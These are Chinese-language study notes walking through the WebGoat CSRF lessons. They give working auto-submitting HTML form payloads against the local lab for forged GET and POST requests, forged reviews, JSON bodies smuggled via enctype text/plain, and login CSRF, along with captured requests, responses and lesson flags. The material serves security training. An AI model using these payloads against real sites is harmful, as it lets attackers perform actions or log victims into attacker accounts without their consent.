# WebGoat CSRF 学习笔记

参考如下博客文章，十分感谢：

* https://blog.csdn.net/elephantxiang/article/details/117827103



## 1. What is a Cross-site request forgery?



## 2. CSRF with a GET request



## 3. Basic Get CSRF Exercise

构造的 CSRF Payload 如下，直接将其文件拖到已经登录 WebGoat 的浏览器中，即可开始攻击！

```html
<!-- 3.html -->
<!DOCTYPE html>
<html>
<head>
    <title>3.Basic Get CSRF Exercise</title>
</head>
<body>
    <h1>3.Basic Get CSRF Exercise</h1>
    <form action="http://127.0.0.1:8081/WebGoat/csrf/basic-get-flag" method="POST">
        <input type="hidden" name="csrf" value="false">
        <input type="submit" name="submit">
    </form>
</body>
</html>
```

```
{
  "flag" : 13643,
  "success" : true,
  "message" : "Congratulations! Appears you made the request from a separate host."
}
```



## ❌ 4. Post a review on someone else’s behalf

> TODO on 25/01/15❕其实直接将其文件拖到已经登录 WebGoat 的浏览器中，页面会自动跳转到登陆页面，这可能就是跨域的限制吧！即如果不是原站点内的跨域请求，则直接使其跳转到登陆页等其它安全页面！！！

利用 BurpSuite 拦截一个正常评论后，前端发给后端的 POST 请求吧，如下所示，会发现其中携带 `Cookie: JSESSIONID=74FF4F8HyiPuVj7XihXAYcSVMqwueSRyWFP0NkKL`！

```api
POST /WebGoat/csrf/review HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 88
sec-ch-ua-platform: "Windows"
Accept-Language: zh-TW,zh;q=0.9
sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/WebGoat/start.mvc?username=hack2024
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=74FF4F8HyiPuVj7XihXAYcSVMqwueSRyWFP0NkKL
Connection: keep-alive

reviewText=2025+happy+new+year%60&stars=666&validateReq=2aa14227b9a13d0bede0388a7fba9aa9
```

```
HTTP/1.1 200 OK
Connection: keep-alive
Content-Type: application/json
Date: Wed, 15 Jan 2025 01:24:53 GMT
Content-Length: 211

{
  "lessonCompleted" : false,
  "feedback" : "It appears your request is coming from the same host you are submitting to.",
  "output" : null,
  "assignment" : "ForgedReviews",
  "attemptWasMade" : true
}
```

故可得提交评论需要 cooike！但因为跨域限制我们没办法获取 cookie，**只能将下述包含 CSRF Payload 的 HTML 文件上传至服务器，然后诱导用户主动点击，此番操作可以解决因跨域限制无法获取 cookie 的困境**！

```html
<!-- 4.html -->
<!DOCTYPE html>
<html>
<head>
    <title>4.Post a review on someone else’s behalf</title>
</head>
<body>
    <h1>4.Post a review on someone else’s behalf</h1>
    <form method="POST" action="http://localhost:8080/WebGoat/csrf/review">
        <input type="text" name="reviewText" placeholder="Add a Review">
        <input type="text" name="stars" placeholder="Add the star number">
        <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
        <input type="submit" name="submit" value="Submit review">
    </form>
</body>
</html>
```

```
{
  "lessonCompleted" : true,
  "feedback" : "It appears you have submitted correctly from another site. Go reload and see if your post is there.",
  "output" : null,
  "assignment" : "ForgedReviews",
  "attemptWasMade" : true
}
```



## 5. Automatic support from frameworks & Custom headers not safe

### Automatic support from frameworks

### Custom headers not safe



## 6. **But I only have JSON APIs and no CORS enabled, how can those be susceptible to CSRF?**



## 7. Cross-Site Request Forgeries

构造的 CSRF Payload 如下，直接将其文件拖到已经登录 WebGoat 的浏览器中，即可开始攻击！


```html
<!-- 7.html -->
<form name="attack" enctype="text/plain" action="http://localhost:8080/WebGoat/csrf/feedback/message" METHOD="POST"> 
    <!-- 请求后，其构成的数据格式为: {name: "HackHuang", email: "hi#hackorg.com", subject: "service", message: "hello world="} -->
    <input type="hidden" name='{"name": "HackHuang", "email": "hi#hackorg.com", "subject": "service","message":"hello world', value='"}'>
</form> 

<script>document.attack.submit();</script>
```

```\
{
  "lessonCompleted" : true,
  "feedback" : "Congratulations you have found the correct solution, the flag is: 8de86aba-f314-400c-9581-1fec08c23c83",
  "output" : null,
  "assignment" : "CSRFFeedback",
  "attemptWasMade" : true
}
```

**问题一：如何构造 json 数据格式 ？**

本关最大的易错点是我们刻意构造的 json 数据有误，如下所示，如果`<input>`标签中没有 value 属性，则请求发送的数据末尾还是会自动加上等号`=`，进而导致最终构造出的 json 数据格式有误，服务器端会因无法正常解析 json 数据而抛错！

```html
<!-- 请求后，其构成的数据格式为: {name: "HackHuang", email: "hi#hackorg.com", subject: "service", message: "hello world"}= -->
<input type="hidden" name='{"name": "HackHuang", "email": "hi#hackorg.com", "subject": "service","message":"hello world"}'>
```

```java
org.springframework.context.NoSuchMessageException: No message found under code 'com.fasterxml.jackson.core.JsonParseException: Unexpected character ('=' (code 61)): ......
```

**问题二：为什么使用`enctype="text/plain"` ？**

如果不使用，则请求发送的数据会被浏览器自动进行 URL 编码：

```html
<!-- 请求后，其构成的数据格式为: %7B%22name%22%3A+%22HackHuang%22%2C+%22email%22%3A+%22hi%23hackorg.com%22%2C+%22subject%22%3A+%22service%22%2C%22message%22%3A%22hello+world=%22%7D -->
<input type="hidden" name='{"name": "HackHuang", "email": "hi#hackorg.com", "subject": "service","message":"hello world', value='"}'>
```

知识扩展：**html中`enctype="text/plain"`的作用 ？**答案如下：

1. 数据编码方式：当设置为 `enctype="text/plain"` 时，表单数据会以**纯文本**的形式提交到服务器，而不是通常使用的 `application/x-www-form-urlencoded`（默认方式） 或 `multipart/form-data` （主要用于文件上传）编码
2. 提交数据的格式：
   * 表单字段名和值以简单的 `键=值` 格式表示
   * 每个字段占一行，字段名和值用等号 `=` 分隔，不进行 **URL 编码**
   * 多个字段之间用换行符分隔



## 8. Login CSRF attack

构造的 CSRF Payload 如下，诱导受害者访问该文件的链接后，即可让受害者成功登录 WebGoat 站点（使用的是黑客身份），这样受害者在站点的所有行为将会被记录，被黑客收集及分析 .

```html
<!-- 8.html -->
<form id="csrfForm" action="http://localhost:8080/WebGoat/login" method="POST">
    <input type="hidden" name="username" value="csrf-hack2024">
    <input type="hidden" name="password" value="password">
</form>
<script>
    // 自动提交表单
    document.getElementById('csrfForm').submit();
</script>
```



## 9. CSRF Impact & CSRF solutions

### Impact

### solutions

#### Same site cookie attribute

#### Other protections
